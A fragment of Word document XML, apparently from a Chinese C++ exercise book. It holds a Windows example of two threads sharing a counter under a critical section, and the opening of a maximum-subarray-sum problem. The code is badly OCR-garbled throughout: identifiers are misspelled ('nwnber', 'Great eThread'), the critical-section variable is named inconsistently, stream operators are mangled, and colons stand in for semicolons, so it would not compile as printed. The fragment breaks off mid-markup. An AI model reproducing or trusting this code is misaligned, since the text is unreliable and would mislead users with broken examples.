          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定义全局変里</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3635"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>CRITICAL.SECTION Critical;</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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定义临界区句柄</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2225"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>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ThreadProcl (void* lp)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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after="60" w:line="240" w:lineRule="auto"/>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540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EnterCri ticalSection(&amp;Cri tied.);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cout « "thread 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^«nwnber « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,Unwnber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.sleep (100);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LeaveCri ti calSecti on (SCri ti csl)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="116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140" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="318" w:lineRule="exact"/>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tabs>
          <w:tab w:val="left" w:pos="2240"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">unsigned long </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>stdcall ThreadProc2 (void* lp)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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while (number &lt; 100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EnterCriticalSection(ACriticsl)</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8" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cout « "thread 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^«nwnber « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>++nwnber</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8" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.sleep (100);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LeaveCri ti calSecti on (&amp;Cri ti c£L)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="116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140" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="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140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1220" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int main</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1220" w:right="0" w:firstLine="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0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Ini ti ali zeCri ti calSecti on (&amp;Cri ti cal) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>初始化临界区对象</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Great eThread (NULL, 0, ThreadProcl, NULL, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Great eThread (NULL, 0, ThreadProc2, NULL, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sleep (10*1000);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>system ("pause")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1220" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="243" w:name="bookmark252"/>
      <w:bookmarkStart w:id="244" w:name="bookmark253"/>
      <w:bookmarkStart w:id="245" w:name="bookmark254"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>38.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>求数组的连续最大和</w:t>
      </w:r>
      <w:bookmarkEnd w:id="243"/>
      <w:bookmarkEnd w:id="244"/>
      <w:bookmarkEnd w:id="245"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;bits/stdc++. h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>using namespace std;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>typedef long long LL;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>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after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="80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220" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int n;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1220" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while (cin &gt;&gt; n) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vector&lt;int&gt; arr;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; n; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2060" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
